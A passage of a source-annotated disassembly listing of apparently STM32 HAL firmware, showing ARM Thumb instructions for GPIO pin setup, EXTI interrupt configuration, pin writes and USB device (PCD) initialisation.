 8001c7c:	009b      	lsls	r3, r3, #2
 8001c7e:	fa02 f303 	lsl.w	r3, r2, r3
 8001c82:	693a      	ldr	r2, [r7, #16]
 8001c84:	4313      	orrs	r3, r2
 8001c86:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001c88:	697b      	ldr	r3, [r7, #20]
 8001c8a:	08da      	lsrs	r2, r3, #3
 8001c8c:	687b      	ldr	r3, [r7, #4]
 8001c8e:	3208      	adds	r2, #8
 8001c90:	6939      	ldr	r1, [r7, #16]
 8001c92:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001c96:	687b      	ldr	r3, [r7, #4]
 8001c98:	681b      	ldr	r3, [r3, #0]
 8001c9a:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001c9c:	697b      	ldr	r3, [r7, #20]
 8001c9e:	005b      	lsls	r3, r3, #1
 8001ca0:	2203      	movs	r2, #3
 8001ca2:	fa02 f303 	lsl.w	r3, r2, r3
 8001ca6:	43db      	mvns	r3, r3
 8001ca8:	693a      	ldr	r2, [r7, #16]
 8001caa:	4013      	ands	r3, r2
 8001cac:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001cae:	683b      	ldr	r3, [r7, #0]
 8001cb0:	685b      	ldr	r3, [r3, #4]
 8001cb2:	f003 0203 	and.w	r2, r3, #3
 8001cb6:	697b      	ldr	r3, [r7, #20]
 8001cb8:	005b      	lsls	r3, r3, #1
 8001cba:	fa02 f303 	lsl.w	r3, r2, r3
 8001cbe:	693a      	ldr	r2, [r7, #16]
 8001cc0:	4313      	orrs	r3, r2
 8001cc2:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001cc4:	687b      	ldr	r3, [r7, #4]
 8001cc6:	693a      	ldr	r2, [r7, #16]
 8001cc8:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001cca:	683b      	ldr	r3, [r7, #0]
 8001ccc:	685b      	ldr	r3, [r3, #4]
 8001cce:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001cd2:	2b00      	cmp	r3, #0
 8001cd4:	f000 8094 	beq.w	8001e00 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001cd8:	4b52      	ldr	r3, [pc, #328]	; (8001e24 <HAL_GPIO_Init+0x2c0>)
 8001cda:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001cdc:	4a51      	ldr	r2, [pc, #324]	; (8001e24 <HAL_GPIO_Init+0x2c0>)
 8001cde:	f043 0301 	orr.w	r3, r3, #1
 8001ce2:	6613      	str	r3, [r2, #96]	; 0x60
 8001ce4:	4b4f      	ldr	r3, [pc, #316]	; (8001e24 <HAL_GPIO_Init+0x2c0>)
 8001ce6:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001ce8:	f003 0301 	and.w	r3, r3, #1
 8001cec:	60bb      	str	r3, [r7, #8]
 8001cee:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001cf0:	4a4d      	ldr	r2, [pc, #308]	; (8001e28 <HAL_GPIO_Init+0x2c4>)
 8001cf2:	697b      	ldr	r3, [r7, #20]
 8001cf4:	089b      	lsrs	r3, r3, #2
 8001cf6:	3302      	adds	r3, #2
 8001cf8:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001cfc:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001cfe:	697b      	ldr	r3, [r7, #20]
 8001d00:	f003 0303 	and.w	r3, r3, #3
 8001d04:	009b      	lsls	r3, r3, #2
 8001d06:	220f      	movs	r2, #15
 8001d08:	fa02 f303 	lsl.w	r3, r2, r3
 8001d0c:	43db      	mvns	r3, r3
 8001d0e:	693a      	ldr	r2, [r7, #16]
 8001d10:	4013      	ands	r3, r2
 8001d12:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001d14:	687b      	ldr	r3, [r7, #4]
 8001d16:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001d1a:	d00d      	beq.n	8001d38 <HAL_GPIO_Init+0x1d4>
 8001d1c:	687b      	ldr	r3, [r7, #4]
 8001d1e:	4a43      	ldr	r2, [pc, #268]	; (8001e2c <HAL_GPIO_Init+0x2c8>)
 8001d20:	4293      	cmp	r3, r2
 8001d22:	d007      	beq.n	8001d34 <HAL_GPIO_Init+0x1d0>
 8001d24:	687b      	ldr	r3, [r7, #4]
 8001d26:	4a42      	ldr	r2, [pc, #264]	; (8001e30 <HAL_GPIO_Init+0x2cc>)
 8001d28:	4293      	cmp	r3, r2
 8001d2a:	d101      	bne.n	8001d30 <HAL_GPIO_Init+0x1cc>
 8001d2c:	2302      	movs	r3, #2
 8001d2e:	e004      	b.n	8001d3a <HAL_GPIO_Init+0x1d6>
 8001d30:	2307      	movs	r3, #7
 8001d32:	e002      	b.n	8001d3a <HAL_GPIO_Init+0x1d6>
 8001d34:	2301      	movs	r3, #1
 8001d36:	e000      	b.n	8001d3a <HAL_GPIO_Init+0x1d6>
 8001d38:	2300      	movs	r3, #0
 8001d3a:	697a      	ldr	r2, [r7, #20]
 8001d3c:	f002 0203 	and.w	r2, r2, #3
 8001d40:	0092      	lsls	r2, r2, #2
 8001d42:	4093      	lsls	r3, r2
 8001d44:	693a      	ldr	r2, [r7, #16]
 8001d46:	4313      	orrs	r3, r2
 8001d48:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001d4a:	4937      	ldr	r1, [pc, #220]	; (8001e28 <HAL_GPIO_Init+0x2c4>)
 8001d4c:	697b      	ldr	r3, [r7, #20]
 8001d4e:	089b      	lsrs	r3, r3, #2
 8001d50:	3302      	adds	r3, #2
 8001d52:	693a      	ldr	r2, [r7, #16]
 8001d54:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001d58:	4b36      	ldr	r3, [pc, #216]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001d5a:	689b      	ldr	r3, [r3, #8]
 8001d5c:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d5e:	68fb      	ldr	r3, [r7, #12]
 8001d60:	43db      	mvns	r3, r3
 8001d62:	693a      	ldr	r2, [r7, #16]
 8001d64:	4013      	ands	r3, r2
 8001d66:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001d68:	683b      	ldr	r3, [r7, #0]
 8001d6a:	685b      	ldr	r3, [r3, #4]
 8001d6c:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001d70:	2b00      	cmp	r3, #0
 8001d72:	d003      	beq.n	8001d7c <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001d74:	693a      	ldr	r2, [r7, #16]
 8001d76:	68fb      	ldr	r3, [r7, #12]
 8001d78:	4313      	orrs	r3, r2
 8001d7a:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001d7c:	4a2d      	ldr	r2, [pc, #180]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001d7e:	693b      	ldr	r3, [r7, #16]
 8001d80:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001d82:	4b2c      	ldr	r3, [pc, #176]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001d84:	68db      	ldr	r3, [r3, #12]
 8001d86:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d88:	68fb      	ldr	r3, [r7, #12]
 8001d8a:	43db      	mvns	r3, r3
 8001d8c:	693a      	ldr	r2, [r7, #16]
 8001d8e:	4013      	ands	r3, r2
 8001d90:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001d92:	683b      	ldr	r3, [r7, #0]
 8001d94:	685b      	ldr	r3, [r3, #4]
 8001d96:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001d9a:	2b00      	cmp	r3, #0
 8001d9c:	d003      	beq.n	8001da6 <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001d9e:	693a      	ldr	r2, [r7, #16]
 8001da0:	68fb      	ldr	r3, [r7, #12]
 8001da2:	4313      	orrs	r3, r2
 8001da4:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001da6:	4a23      	ldr	r2, [pc, #140]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001da8:	693b      	ldr	r3, [r7, #16]
 8001daa:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001dac:	4b21      	ldr	r3, [pc, #132]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001dae:	685b      	ldr	r3, [r3, #4]
 8001db0:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001db2:	68fb      	ldr	r3, [r7, #12]
 8001db4:	43db      	mvns	r3, r3
 8001db6:	693a      	ldr	r2, [r7, #16]
 8001db8:	4013      	ands	r3, r2
 8001dba:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001dbc:	683b      	ldr	r3, [r7, #0]
 8001dbe:	685b      	ldr	r3, [r3, #4]
 8001dc0:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001dc4:	2b00      	cmp	r3, #0
 8001dc6:	d003      	beq.n	8001dd0 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001dc8:	693a      	ldr	r2, [r7, #16]
 8001dca:	68fb      	ldr	r3, [r7, #12]
 8001dcc:	4313      	orrs	r3, r2
 8001dce:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001dd0:	4a18      	ldr	r2, [pc, #96]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001dd2:	693b      	ldr	r3, [r7, #16]
 8001dd4:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001dd6:	4b17      	ldr	r3, [pc, #92]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001dd8:	681b      	ldr	r3, [r3, #0]
 8001dda:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001ddc:	68fb      	ldr	r3, [r7, #12]
 8001dde:	43db      	mvns	r3, r3
 8001de0:	693a      	ldr	r2, [r7, #16]
 8001de2:	4013      	ands	r3, r2
 8001de4:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001de6:	683b      	ldr	r3, [r7, #0]
 8001de8:	685b      	ldr	r3, [r3, #4]
 8001dea:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001dee:	2b00      	cmp	r3, #0
 8001df0:	d003      	beq.n	8001dfa <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001df2:	693a      	ldr	r2, [r7, #16]
 8001df4:	68fb      	ldr	r3, [r7, #12]
 8001df6:	4313      	orrs	r3, r2
 8001df8:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001dfa:	4a0e      	ldr	r2, [pc, #56]	; (8001e34 <HAL_GPIO_Init+0x2d0>)
 8001dfc:	693b      	ldr	r3, [r7, #16]
 8001dfe:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001e00:	697b      	ldr	r3, [r7, #20]
 8001e02:	3301      	adds	r3, #1
 8001e04:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001e06:	683b      	ldr	r3, [r7, #0]
 8001e08:	681a      	ldr	r2, [r3, #0]
 8001e0a:	697b      	ldr	r3, [r7, #20]
 8001e0c:	fa22 f303 	lsr.w	r3, r2, r3
 8001e10:	2b00      	cmp	r3, #0
 8001e12:	f47f aeaf 	bne.w	8001b74 <HAL_GPIO_Init+0x10>
  }
}
 8001e16:	bf00      	nop
 8001e18:	bf00      	nop
 8001e1a:	371c      	adds	r7, #28
 8001e1c:	46bd      	mov	sp, r7
 8001e1e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001e22:	4770      	bx	lr
 8001e24:	40021000 	.word	0x40021000
 8001e28:	40010000 	.word	0x40010000
 8001e2c:	48000400 	.word	0x48000400
 8001e30:	48000800 	.word	0x48000800
 8001e34:	40010400 	.word	0x40010400

08001e38 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001e38:	b480      	push	{r7}
 8001e3a:	b083      	sub	sp, #12
 8001e3c:	af00      	add	r7, sp, #0
 8001e3e:	6078      	str	r0, [r7, #4]
 8001e40:	460b      	mov	r3, r1
 8001e42:	807b      	strh	r3, [r7, #2]
 8001e44:	4613      	mov	r3, r2
 8001e46:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001e48:	787b      	ldrb	r3, [r7, #1]
 8001e4a:	2b00      	cmp	r3, #0
 8001e4c:	d003      	beq.n	8001e56 <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001e4e:	887a      	ldrh	r2, [r7, #2]
 8001e50:	687b      	ldr	r3, [r7, #4]
 8001e52:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001e54:	e002      	b.n	8001e5c <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001e56:	887a      	ldrh	r2, [r7, #2]
 8001e58:	687b      	ldr	r3, [r7, #4]
 8001e5a:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001e5c:	bf00      	nop
 8001e5e:	370c      	adds	r7, #12
 8001e60:	46bd      	mov	sp, r7
 8001e62:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001e66:	4770      	bx	lr

08001e68 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001e68:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001e6a:	b08b      	sub	sp, #44	; 0x2c
 8001e6c:	af06      	add	r7, sp, #24
 8001e6e:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001e70:	687b      	ldr	r3, [r7, #4]
 8001e72:	2b00      	cmp	r3, #0
 8001e74:	d101      	bne.n	8001e7a <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001e76:	2301      	movs	r3, #1
 8001e78:	e0f8      	b.n	800206c <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001e7a:	687b      	ldr	r3, [r7, #4]
 8001e7c:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001e80:	b2db      	uxtb	r3, r3
 8001e82:	2b00      	cmp	r3, #0
 8001e84:	d106      	bne.n	8001e94 <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001e86:	687b      	ldr	r3, [r7, #4]
 8001e88:	2200      	movs	r2, #0
 8001e8a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001e8e:	6878      	ldr	r0, [r7, #4]
 8001e90:	f00a fde4 	bl	800ca5c <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001e94:	687b      	ldr	r3, [r7, #4]
 8001e96:	2203      	movs	r2, #3
 8001e98:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001e9c:	687b      	ldr	r3, [r7, #4]
 8001e9e:	681b      	ldr	r3, [r3, #0]
 8001ea0:	4618      	mov	r0, r3
 8001ea2:	f004 f8d4 	bl	800604e <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001ea6:	687b      	ldr	r3, [r7, #4]
 8001ea8:	681b      	ldr	r3, [r3, #0]
 8001eaa:	603b      	str	r3, [r7, #0]
 8001eac:	687e      	ldr	r6, [r7, #4]
 8001eae:	466d      	mov	r5, sp
 8001eb0:	f106 0410 	add.w	r4, r6, #16
 8001eb4:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001eb6:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001eb8:	6823      	ldr	r3, [r4, #0]
 8001eba:	602b      	str	r3, [r5, #0]
 8001ebc:	1d33      	adds	r3, r6, #4
 8001ebe:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001ec0:	6838      	ldr	r0, [r7, #0]
 8001ec2:	f004 f89c 	bl	8005ffe <USB_CoreInit>
 8001ec6:	4603      	mov	r3, r0
 8001ec8:	2b00      	cmp	r3, #0
 8001eca:	d005      	beq.n	8001ed8 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001ecc:	687b      	ldr	r3, [r7, #4]
 8001ece:	2202      	movs	r2, #2
 8001ed0:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001ed4:	2301      	movs	r3, #1
 8001ed6:	e0c9      	b.n	800206c <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001ed8:	687b      	ldr	r3, [r7, #4]
 8001eda:	681b      	ldr	r3, [r3, #0]
 8001edc:	2100      	movs	r1, #0
 8001ede:	4618      	mov	r0, r3
 8001ee0:	f004 f8d0 	bl	8006084 <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001ee4:	2300      	movs	r3, #0
 8001ee6:	73fb      	strb	r3, [r7, #15]
 8001ee8:	e040      	b.n	8001f6c <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001eea:	7bfb      	ldrb	r3, [r7, #15]
 8001eec:	6879      	ldr	r1, [r7, #4]
 8001eee:	1c5a      	adds	r2, r3, #1
 8001ef0:	4613      	mov	r3, r2
 8001ef2:	009b      	lsls	r3, r3, #2
 8001ef4:	4413      	add	r3, r2
 8001ef6:	00db      	lsls	r3, r3, #3
 8001ef8:	440b      	add	r3, r1
 8001efa:	3301      	adds	r3, #1
 8001efc:	2201      	movs	r2, #1
 8001efe:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001f00:	7bfb      	ldrb	r3, [r7, #15]
 8001f02:	6879      	ldr	r1, [r7, #4]
 8001f04:	1c5a      	adds	r2, r3, #1
 8001f06:	4613      	mov	r3, r2
 8001f08:	009b      	lsls	r3, r3, #2
 8001f0a:	4413      	add	r3, r2
 8001f0c:	00db      	lsls	r3, r3, #3
 8001f0e:	440b      	add	r3, r1
 8001f10:	7bfa      	ldrb	r2, [r7, #15]
 8001f12:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001f14:	7bfb      	ldrb	r3, [r7, #15]
 8001f16:	6879      	ldr	r1, [r7, #4]
 8001f18:	1c5a      	adds	r2, r3, #1
 8001f1a:	4613      	mov	r3, r2
 8001f1c:	009b      	lsls	r3, r3, #2
 8001f1e:	4413      	add	r3, r2
 8001f20:	00db      	lsls	r3, r3, #3
 8001f22:	440b      	add	r3, r1
 8001f24:	3303      	adds	r3, #3
 8001f26:	2200      	movs	r2, #0
 8001f28:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001f2a:	7bfa      	ldrb	r2, [r7, #15]
 8001f2c:	6879      	ldr	r1, [r7, #4]
 8001f2e:	4613      	mov	r3, r2
 8001f30:	009b      	lsls	r3, r3, #2
 8001f32:	4413      	add	r3, r2
 8001f34:	00db      	lsls	r3, r3, #3
 8001f36:	440b      	add	r3, r1
 8001f38:	3338      	adds	r3, #56	; 0x38
 8001f3a:	2200      	movs	r2, #0
 8001f3c:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001f3e:	7bfa      	ldrb	r2, [r7, #15]
 8001f40:	6879      	ldr	r1, [r7, #4]
 8001f42:	4613      	mov	r3, r2
 8001f44:	009b      	lsls	r3, r3, #2
 8001f46:	4413      	add	r3, r2
 8001f48:	00db      	lsls	r3, r3, #3
 8001f4a:	440b      	add	r3, r1
 8001f4c:	333c      	adds	r3, #60	; 0x3c
 8001f4e:	2200      	movs	r2, #0
 8001f50:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001f52:	7bfa      	ldrb	r2, [r7, #15]
 8001f54:	6879      	ldr	r1, [r7, #4]
 8001f56:	4613      	mov	r3, r2
 8001f58:	009b      	lsls	r3, r3, #2
 8001f5a:	4413      	add	r3, r2
 8001f5c:	00db      	lsls	r3, r3, #3
 8001f5e:	440b      	add	r3, r1
 8001f60:	3340      	adds	r3, #64	; 0x40
 8001f62:	2200      	movs	r2, #0
 8001f64:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001f66:	7bfb      	ldrb	r3, [r7, #15]
 8001f68:	3301      	adds	r3, #1
 8001f6a:	73fb      	strb	r3, [r7, #15]
 8001f6c:	7bfa      	ldrb	r2, [r7, #15]
 8001f6e:	687b      	ldr	r3, [r7, #4]
 8001f70:	685b      	ldr	r3, [r3, #4]
 8001f72:	429a      	cmp	r2, r3
 8001f74:	d3b9      	bcc.n	8001eea <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001f76:	2300      	movs	r3, #0
 8001f78:	73fb      	strb	r3, [r7, #15]
 8001f7a:	e044      	b.n	8002006 <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001f7c:	7bfa      	ldrb	r2, [r7, #15]
 8001f7e:	6879      	ldr	r1, [r7, #4]
 8001f80:	4613      	mov	r3, r2
 8001f82:	009b      	lsls	r3, r3, #2
 8001f84:	4413      	add	r3, r2
 8001f86:	00db      	lsls	r3, r3, #3
 8001f88:	440b      	add	r3, r1
 8001f8a:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001f8e:	2200      	movs	r2, #0
 8001f90:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001f92:	7bfa      	ldrb	r2, [r7, #15]
 8001f94:	6879      	ldr	r1, [r7, #4]
 8001f96:	4613      	mov	r3, r2
 8001f98:	009b      	lsls	r3, r3, #2
 8001f9a:	4413      	add	r3, r2
 8001f9c:	00db      	lsls	r3, r3, #3
 8001f9e:	440b      	add	r3, r1
 8001fa0:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001fa4:	7bfa      	ldrb	r2, [r7, #15]
 8001fa6:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001fa8:	7bfa      	ldrb	r2, [r7, #15]
 8001faa:	6879      	ldr	r1, [r7, #4]
 8001fac:	4613      	mov	r3, r2
 8001fae:	009b      	lsls	r3, r3, #2
 8001fb0:	4413      	add	r3, r2
 8001fb2:	00db      	lsls	r3, r3, #3
 8001fb4:	440b      	add	r3, r1
 8001fb6:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001fba:	2200      	movs	r2, #0
 8001fbc:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001fbe:	7bfa      	ldrb	r2, [r7, #15]
 8001fc0:	6879      	ldr	r1, [r7, #4]
 8001fc2:	4613      	mov	r3, r2
 8001fc4:	009b      	lsls	r3, r3, #2
 8001fc6:	4413      	add	r3, r2
 8001fc8:	00db      	lsls	r3, r3, #3
 8001fca:	440b      	add	r3, r1
 8001fcc:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001fd0:	2200      	movs	r2, #0
 8001fd2:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001fd4:	7bfa      	ldrb	r2, [r7, #15]
 8001fd6:	6879      	ldr	r1, [r7, #4]
 8001fd8:	4613      	mov	r3, r2
 8001fda:	009b      	lsls	r3, r3, #2
 8001fdc:	4413      	add	r3, r2
 8001fde:	00db      	lsls	r3, r3, #3
 8001fe0:	440b      	add	r3, r1
 8001fe2:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001fe6:	2200      	movs	r2, #0
 8001fe8:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001fea:	7bfa      	ldrb	r2, [r7, #15]
 8001fec:	6879      	ldr	r1, [r7, #4]
 8001fee:	4613      	mov	r3, r2
 8001ff0:	009b      	lsls	r3, r3, #2
 8001ff2:	4413      	add	r3, r2
 8001ff4:	00db      	lsls	r3, r3, #3
 8001ff6:	440b      	add	r3, r1
 8001ff8:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001ffc:	2200      	movs	r2, #0
 8001ffe:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8002000:	7bfb      	ldrb	r3, [r7, #15]
 8002002:	3301      	adds	r3, #1
 8002004:	73fb      	strb	r3, [r7, #15]
 8002006:	7bfa      	ldrb	r2, [r7, #15]
 8002008:	687b      	ldr	r3, [r7, #4]
 800200a:	685b      	ldr	r3, [r3, #4]
 800200c:	429a      	cmp	r2, r3
 800200e:	d3b5      	bcc.n	8001f7c <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8002010:	687b      	ldr	r3, [r7, #4]
 8002012:	681b      	ldr	r3, [r3, #0]
 8002014:	603b      	str	r3, [r7, #0]
 8002016:	687e      	ldr	r6, [r7, #4]
 8002018:	466d      	mov	r5, sp
 800201a:	f106 0410 	add.w	r4, r6, #16
 800201e:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8002020:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8002022:	6823      	ldr	r3, [r4, #0]
 8002024:	602b      	str	r3, [r5, #0]
 8002026:	1d33      	adds	r3, r6, #4
 8002028:	cb0e      	ldmia	r3, {r1, r2, r3}
 800202a:	6838      	ldr	r0, [r7, #0]
 800202c:	f004 f837 	bl	800609e <USB_DevInit>
 8002030:	4603      	mov	r3, r0
 8002032:	2b00      	cmp	r3, #0
 8002034:	d005      	beq.n	8002042 <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8002036:	687b      	ldr	r3, [r7, #4]
 8002038:	2202      	movs	r2, #2
 800203a:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 800203e:	2301      	movs	r3, #1
 8002040:	e014      	b.n	800206c <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8002042:	687b      	ldr	r3, [r7, #4]
 8002044:	2200      	movs	r2, #0
 8002046:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 800204a:	687b      	ldr	r3, [r7, #4]
 800204c:	2201      	movs	r2, #1
 800204e:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8002052:	687b      	ldr	r3, [r7, #4]
 8002054:	69db      	ldr	r3, [r3, #28]
 8002056:	2b01      	cmp	r3, #1
 8002058:	d102      	bne.n	8002060 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 800205a:	6878      	ldr	r0, [r7, #4]
 800205c:	f001 fc9e 	bl	800399c <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8002060:	687b      	ldr	r3, [r7, #4]
 8002062:	681b      	ldr	r3, [r3, #0]
 8002064:	4618      	mov	r0, r3
 8002066:	f006 fadf 	bl	8008628 <USB_DevDisconnect>

  return HAL_OK;
 800206a:	2300      	movs	r3, #0
}
